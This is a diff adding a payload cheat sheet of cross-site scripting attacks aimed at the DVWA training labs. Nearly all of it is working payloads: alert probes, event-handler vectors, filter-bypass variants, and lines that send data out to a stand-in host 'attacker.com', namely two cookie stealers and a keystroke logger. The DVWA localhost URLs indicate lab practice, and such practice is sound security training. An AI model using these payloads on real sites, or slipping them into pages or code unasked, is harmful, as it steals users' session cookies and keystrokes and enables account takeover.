@@ -1,0 +1,39 @@
+# XSS Payloads for DVWA
+# Works for DOM, Reflected, and Stored XSS labs
+
+# Basic Alert
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+
+# Event Handlers
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+
+# Cookie Stealing
+<script>new Image().src="http://attacker.com/steal.php?c="+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
+
+# Keylogger
+<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
+
+# DOM XSS (for DVWA DOM XSS lab)
+# URL: http://localhost:8081/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+</option></select><img src=x onerror=alert('XSS')>
+
+# Reflected XSS
+# URL: http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
+
+# Stored XSS - put in name or message field
+# URL: http://localhost:8081/vulnerabilities/xss_s/
+
+# Filter Bypass
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert`XSS`>
+<svg/onload=alert('XSS')>
+<<script>alert('XSS');//<</script>
